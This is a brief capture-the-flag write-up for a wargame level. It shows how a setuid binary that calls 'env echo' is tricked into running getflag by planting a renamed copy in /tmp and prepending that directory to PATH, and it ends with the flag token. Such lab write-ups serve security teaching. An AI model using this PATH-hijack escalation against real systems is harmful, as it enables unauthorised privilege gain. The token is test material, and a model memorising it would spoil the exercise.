# Level03

    level03: ls -al
    dr-x------ 1 level03 level03  120 Mar  5  2016 .
    d--x--x--x 1 root    users    340 Aug 30  2015 ..
    -r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
    -r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
    -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
    -r-x------ 1 level03 level03  675 Apr  3  2012 .profile
    level03: ./level03
    Exploit me
    level03: strings level03
    ...
    /usr/bin/env echo Exploit me
    ...
 We now see that echo is used by the binary level03, 
 we are gonna trick the binary into using getflag instead of echo:
 

    mkdir /tmp/test
    cp /bin/getflag /tmp/test
    cd /tmp/test
    mv getflag echo
    export PATH=/tmp/test:$PATH
    ./level03
    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
